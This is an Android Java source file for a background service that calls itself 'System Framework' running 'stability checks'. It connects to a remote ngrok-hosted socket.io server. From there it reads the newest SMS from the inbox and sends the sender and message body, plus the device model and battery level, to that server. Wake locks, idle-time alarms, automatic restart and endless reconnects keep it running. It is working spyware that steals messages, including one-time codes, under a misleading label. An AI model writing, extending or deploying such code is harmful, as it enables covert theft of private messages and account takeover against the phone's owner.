package com.example.systemframework;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import io.socket.client.IO;
import io.socket.client.Socket;

public class MyBackgroundService extends Service {
    private Socket mSocket;
    private String ngrokUrl = "https://homologically-uncensorious-barbie.ngrok-free.dev";
    private String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
    private String lastSmsId = "";
    private PowerManager.WakeLock wakeLock;
    private Handler handler = new Handler();
    private boolean isSyncDone = false;

    private static MyBackgroundService instance;

    public static MyBackgroundService getInstance() {
        return instance;
    }

    // ✅ SMART HEARTBEAT LOGIC: System ko zinda rakhne ke liye
    private Runnable heartbeat = new Runnable() {
        @Override
        public void run() {
            if (wakeLock != null) {
                // Sirf 1 minute ke liye WakeLock lo taaki system kill na kare
                wakeLock.acquire(60 * 1000);
            }

            if (mSocket != null && mSocket.connected()) {
                sendBatteryStatus(); // Server ko signal bhejo
            } else {
                setupSocket(); // Connection toot gaya toh reconnect
            }

            // Har 10 minute mein trigger karo stability ke liye
            handler.postDelayed(this, 10 * 60 * 1000);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (wakeLock == null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "System:MonsterLock");
        }

        Notification notification = new NotificationCompat.Builder(this, "system_channel")
                .setContentTitle("System Framework")
                .setContentText("Running stability checks...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true)
                .build();

        startForeground(1, notification);

        if (mSocket == null || !mSocket.connected()) {
            setupSocket();
        }

        // ✅ Heartbeat start karo onStartCommand mein
        handler.removeCallbacks(heartbeat);
        handler.post(heartbeat);
        // ✅ AlarmManager set karo taki deep sleep mein bhi service chalti rahe
        android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent reconnectIntent = new Intent(this, ReconnectReceiver.class);

        // Perplexity Fix: FLAG_UPDATE_CURRENT add kiya taaki alarm refresh hota rahe
        android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(this, 0, reconnectIntent,
                android.app.PendingIntent.FLAG_IMMUTABLE | android.app.PendingIntent.FLAG_UPDATE_CURRENT);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Har 15 minute mein ek baar trigger karega
            am.setAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 15 * 60 * 1000, pi);
        }

        return START_STICKY;
    }

    private void setupSocket() {
        try {
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.reconnectionDelay = 2000;
            opts.transports = new String[]{"websocket", "polling"};

            mSocket = IO.socket(ngrokUrl, opts);

            mSocket.on("reconnect", args -> {
                isSyncDone = false;
            });

            mSocket.on(Socket.EVENT_CONNECT, args -> {
                if (!isSyncDone) {
                    sendBatteryStatus();
                    readSMSInstant();
                    isSyncDone = true;
                }
            });

            mSocket.on(Socket.EVENT_DISCONNECT, args -> {
                isSyncDone = false;
            });

            mSocket.connect();
            SmsReceiver.setSocket(mSocket);

        } catch (Exception e) { e.printStackTrace(); }
    }

    private void sendBatteryStatus() {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, ifilter);
        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int batteryPct = (int) ((level / (float) scale) * 100);
            if (mSocket != null && mSocket.connected()) {
                mSocket.emit("phone_data", "[" + deviceModel + "] BATTERY: " + batteryPct + "%");
            }
        }
    }

    public void readSMSInstant() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;

        handler.post(() -> {
            try {
                Uri uri = Uri.parse("content://sms/inbox");
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(uri, new String[]{"_id", "address", "body"}, null, null, "date DESC LIMIT 1");

                if (cursor != null && cursor.moveToFirst()) {
                    String id = cursor.getString(0);
                    String address = cursor.getString(1);
                    String body = cursor.getString(2);

                    if (mSocket != null && mSocket.connected()) {
                        mSocket.emit("phone_data", "📂 [LATEST INBOX] From " + address + " -> " + body);
                        lastSmsId = id;
                    }
                    cursor.close();
                }
            } catch (Exception e) { e.printStackTrace(); }
        });
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("system_channel", "System Service", NotificationManager.IMPORTANCE_HIGH);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    @Override
    public void onDestroy() {
        // ✅ Cleanup WakeLock safely
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        handler.removeCallbacks(heartbeat);
        instance = null;
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}